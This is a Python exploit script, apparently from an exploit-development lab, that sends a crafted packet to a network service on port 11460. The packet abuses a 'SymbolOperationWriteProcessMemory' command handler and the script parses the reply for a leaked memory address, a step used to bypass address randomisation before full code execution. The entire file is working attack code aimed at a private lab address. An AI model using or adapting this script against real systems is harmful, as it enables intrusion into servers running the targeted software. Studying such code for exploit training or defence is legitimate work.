#!/usr/bin/env python3

import socket
import sys
from struct import pack

# psAgentCommand
buf = bytearray([0x41] * 0xC)
buf += pack("<i", 0x2000)  # opcode
buf += pack("<i", 0x0)  # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41] * 0x8)

# psCommandBuffer
symbol = b"SymbolOperationWriteProcessMemory" + b"\x00"
buf += symbol + b"A" * (100 - len(symbol))
buf += b"B" * 0x100
buf += b"C" * 0x100

# Checksum
buf = pack(">i", len(buf) - 4) + buf


def parseResponse(response):
    """ Parse a server response and extract the leaked address """
    pattern = b"Address is:"
    address = None
    for line in response.split(b"\n"):
        if line.find(pattern) != -1:
            address = int((line.split(pattern)[-1].strip()), 16)
    if not address:
        print("[-] Could not find the address in the Response")
        sys.exit()
    return address


def main():
    server = "192.168.185.10"
    port = 11460

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))

    s.send(buf)

    response = s.recv(1024)
    address = parseResponse(response)
    print(hex(address))

    s.close()

    print("[+] Packet sent")
    sys.exit(0)


if __name__ == "__main__":
    main()
